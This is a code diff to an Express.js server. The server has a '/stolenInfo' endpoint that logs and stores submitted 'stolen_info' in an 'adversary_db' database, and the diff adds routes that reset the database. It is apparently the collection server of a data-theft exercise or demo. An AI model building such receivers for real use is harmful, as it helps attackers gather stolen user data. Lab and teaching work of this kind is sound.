@@ -22,7 +22,7 @@ app.get('/', (req, res) => {
     })
   })
   
-  app.post('/stolenInfo', (req, res) => {
+app.post('/stolenInfo', (req, res) => {
     console.log(req.body)
     const info = req.body.stolen_info;
 
@@ -39,6 +39,32 @@ app.get('/', (req, res) => {
         }
     });
 });
+
+app.delete('/resetDB', (req, res) => {
+
+    let sql = 'DELETE FROM adversary_db.posts WHERE id;'
+    connection.query(sql, (err, result) => {
+        if (err) {
+            throw err
+        }
+        else {
+            res.send(JSON.parse(JSON.stringify(result)))
+        }
+    })  
+});
+
+function reset_db() {
+    let sql = 'DELETE FROM adversary_db.posts WHERE id;'
+    connection.query(sql, (err, result) => {
+        if (err) {
+            throw err
+        }
+        else {
+            console.log(JSON.parse(JSON.stringify(result)))
+        }
+    })  
+}
+create_db()
 
   app.listen(port, () => {
     console.log(`Example app listening on port ${port}`)
